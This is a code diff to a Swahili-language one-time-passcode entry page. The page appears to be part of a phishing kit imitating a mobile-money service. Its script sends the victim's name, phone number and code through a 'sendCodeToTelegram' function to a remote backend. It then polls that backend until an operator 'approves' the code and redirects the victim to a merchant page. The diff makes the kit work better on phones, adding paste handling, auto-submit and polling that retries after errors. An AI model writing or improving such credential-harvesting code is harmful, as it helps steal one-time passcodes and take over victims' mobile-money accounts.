@@ -226,10 +226,10 @@ button:not(:disabled):active {
     <form id="otpForm"> 
       <div class="label">Weka msimbo wa uthibitisho</div> 
       <div class="otp-boxes"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]" type="text"> 
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]" type="text"> 
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]" type="text"> 
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]" type="text"> 
       </div> 
       <div id="timerContainer"> 
         Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde 
@@ -243,7 +243,7 @@ button:not(:disabled):active {
   </div> 
 </div>
 
-<!-- ===== YOUR LOGIC — UNTOUCHED except redirect ===== -->
+<!-- ===== FIXED LOGIC with mobile support ===== -->
 <script>
 const BACKEND_URL = "https://mixx-by-yass.onrender.com";
 const params = new URLSearchParams(window.location.search);
@@ -268,25 +268,88 @@ const timerDisplay = document.getElementById('timerDisplay');
 
 let countdown;
 
-// Handle keyboard input for OTP boxes
-document.addEventListener('keydown', e => {
-  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;
+// Handle input for OTP boxes - Mobile friendly
+inputs.forEach((input, index) => {
+  // Handle input events
+  input.addEventListener('input', function(e) {
+    // Get the current value
+    let value = this.value;
+    
+    // Only allow digits
+    if (!/^[0-9]$/.test(value) && value !== '') {
+      this.value = '';
+      return;
+    }
+    
+    // Auto-advance to next input if current is filled
+    if (value !== '' && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+    
+    // Update button state
+    updateSubmitButton();
+    
+    // Auto-submit when all digits are entered
+    if (getOTPCode().length === 4) {
+      document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+    }
+  });
+  
+  // Handle backspace to go to previous input
+  input.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+      inputs[index - 1].focus();
+    }
+  });
+  
+  // Handle paste event for mobile
+  input.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+    const digits = pastedData.replace(/\D/g, '').slice(0, 4);
+    
+    if (digits) {
+      // Fill inputs with pasted digits
+      const digitArray = digits.split('');
+      digitArray.forEach((digit, i) => {
+        if (i < inputs.length) {
+          inputs[i].value = digit;
+        }
+      });
+      
+      // Focus on last filled input or next empty
+      const lastFilledIndex = Math.min(digitArray.length, inputs.length) - 1;
+      if (lastFilledIndex < inputs.length - 1) {
+        inputs[lastFilledIndex + 1].focus();
+      } else {
+        inputs[inputs.length - 1].focus();
+      }
+      
+      updateSubmitButton();
+      
+      // Auto-submit if all digits filled
+      if (getOTPCode().length === 4) {
+        document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+      }
+    }
+  });
+});
 
-  const values = [...inputs].map(i => i.value);
-  const index = values.findIndex(v => v === "");
+// Helper function to get OTP code
+function getOTPCode() {
+  return [...inputs].map(i => i.value).join('');
+}
 
-  if(e.key === "Backspace") {
-    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
-    if(lastFilled >= 0) inputs[lastFilled].value = "";
-    submitBtn.disabled = ![...inputs].every(i => i.value);
-  } else if(index !== -1) {
-    inputs[index].value = e.key;
-    submitBtn.disabled = ![...inputs].every(i => i.value);
-  }
+// Update submit button state
+function updateSubmitButton() {
+  const allFilled = [...inputs].every(i => i.value !== '');
+  submitBtn.disabled = !allFilled;
+}
 
-  // Auto-submit when all 4 digits are entered
-  if([...inputs].every(i => i.value)) {
-    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+// Focus first input on page load
+window.addEventListener('load', function() {
+  if (inputs.length > 0) {
+    inputs[0].focus();
   }
 });
 
@@ -324,20 +387,25 @@ async function sendCodeToTelegram(name, phone, code){
 function pollCodeApproval(requestId){
   return new Promise(resolve=>{
     const i=setInterval(async()=>{
-      const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
-      const d=await r.json();
-      if(d.approved===true||d.approved===false){
-        clearInterval(i);
-        resolve(d.approved);
+      try {
+        const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+        const d=await r.json();
+        if(d.approved===true||d.approved===false){
+          clearInterval(i);
+          resolve(d.approved);
+        }
+      } catch(e) {
+        // Continue polling on error
       }
     },1500);
   });
 }
 
-document.getElementById('otpForm').addEventListener('submit', async e=>{
+document.getElementById('otpForm').addEventListener('submit', async function(e){
   e.preventDefault();
+  e.stopPropagation();
   
-  const code=[...inputs].map(i=>i.value).join('');
+  const code = getOTPCode();
   
   // Check if all digits are entered
   if(code.length !== 4) {
@@ -371,7 +439,6 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
     localStorage.setItem('code', code);
     statusEl.textContent="Code verified! Redirecting...";
     setTimeout(() => {
-      // ✅ CHANGED: Now redirects to success.html instead of merchant.html
       window.location.href=`merchant.html?botId=${botId}`;
     }, 500);
   }else{
@@ -381,6 +448,16 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
     btnText.textContent="WASILISHA";
     spinner.style.display="none";
     startCountdown();
+    if (inputs.length > 0) {
+      inputs[0].focus();
+    }
+  }
+});
+
+// Manual click handler for button (fallback for mobile)
+submitBtn.addEventListener('click', function(e) {
+  if (!this.disabled) {
+    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
   }
 });
 </script>
